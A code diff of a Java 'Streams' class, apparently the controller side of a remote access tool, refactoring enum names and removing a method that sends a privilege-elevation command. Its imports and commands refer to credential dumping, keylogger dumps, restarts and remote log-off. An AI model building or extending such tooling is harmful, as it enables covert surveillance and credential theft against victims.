@@ -1,12 +1,11 @@
 package Connections;
 
 
-import GUI.TableUtils.Connection.ConnectionEnum;
+import GUI.TableUtils.Connection.Constants.ConnStatus;
 import GUI.TableUtils.Credentials.Dumper.CredentialsDumper;
 import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
-import GUI.TableUtils.KeyLogger.KeyloggerEvents;
-import GUI.TableUtils.Permissions.Permissions;
-import GUI.TableUtils.SystemState.State;
+import GUI.TableUtils.KeyLogger.Constants.KeyLog;
+import GUI.TableUtils.SystemState.Constants.SystemStatus;
 import Information.*;
 
 
@@ -299,9 +298,9 @@ public class Streams {
         }
     }
 
-    public void sendAction(KeyloggerEvents event, String nameOfSession) throws IOException {
+    public void sendAction(KeyLog event, String nameOfSession) throws IOException {
         JSONObject jsonObject = new JSONObject();
-        
+
         switch (event) {
             case DUMP_LAST -> {
                 jsonObject.put("ACTION", "DUMP_LAST");
@@ -338,19 +337,6 @@ public class Streams {
         }
     }
 
-    public int sendAndReadAction(Permissions permissions) throws IOException {
-        JSONObject object = new JSONObject();
-        switch (permissions) {
-            case ELEVATE_PRIVILEGES -> {
-                
-                object.put("ACTION", "ELEVATE");
-                mainStream.sendString(object.toString());
-                return readSize();
-            }
-
-        }
-        return 0;
-    }
 /*
     public void sendAction(Screen action) throws IOException {
         JSONObject jsonObject = new JSONObject();
@@ -362,7 +348,7 @@ public class Streams {
     }
 */
 
-    public void sendAction(ConnectionEnum action) throws IOException {
+    public void sendAction(ConnStatus action) throws IOException {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case RESTART -> {
@@ -380,10 +366,10 @@ public class Streams {
         }
     }
 
-    public void stateAction(State state) throws IOException {
+    public void stateAction(SystemStatus systemStatus) throws IOException {
         JSONObject jsonObject = new JSONObject();
-        jsonObject.put("ACTION","SYSTEM_STATE");
-        switch (state) {
+        jsonObject.put("ACTION", "SYSTEM_STATE");
+        switch (systemStatus) {
             case LOG_OFF -> {
                 jsonObject.put("SUB_ACTION", 0);
                 mainStream.sendString(jsonObject.toString());
